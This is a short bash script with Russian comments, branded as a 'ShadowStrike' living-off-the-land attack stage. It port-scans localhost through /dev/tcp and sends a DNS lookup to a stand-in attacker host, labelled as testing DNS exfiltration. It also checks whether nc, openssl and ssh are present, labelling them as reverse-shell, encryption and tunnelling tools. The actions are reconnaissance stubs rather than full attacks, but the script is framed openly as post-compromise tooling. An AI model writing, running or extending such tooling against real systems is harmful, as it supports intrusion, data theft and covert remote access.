#!/bin/bash
# LIVING OFF THE LAND — Используем только то что уже есть в системе
# Никаких загрузок, только легитимные утилиты

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — LIVING OFF THE LAND        ║"
echo "║   Только системные утилиты                  ║"
echo "╚══════════════════════════════════════════════╝"

# Авто-поиск доступных инструментов
echo "[LOTL] Аудит доступных системных утилит..."

# Сканирование портов через /dev/tcp (встроено в bash!)
echo "[LOTL] Сканер портов (чистый bash):"
for port in 22 80 443 3306 6379 8080; do
    timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "  🔴 $port открыт"
done

# Загрузка файлов через DNS (dig)
echo "[LOTL] Exfil через DNS:"
dig +short "test.attacker.com" 2>/dev/null && echo "  ✅ DNS рабочий"

# Обратный шелл через netcat
echo "[LOTL] Обратный шелл (nc):"
command -v nc >/dev/null 2>&1 && echo "  ✅ nc доступен"

# Шифрование через openssl
echo "[LOTL] Шифрование (openssl):"
command -v openssl >/dev/null 2>&1 && echo "  ✅ openssl доступен"

# Прокси через ssh
echo "[LOTL] Туннель (ssh):"
command -v ssh >/dev/null 2>&1 && echo "  ✅ ssh доступен"

echo "[LOTL] Ничего не скачано. Всё уже было в системе."
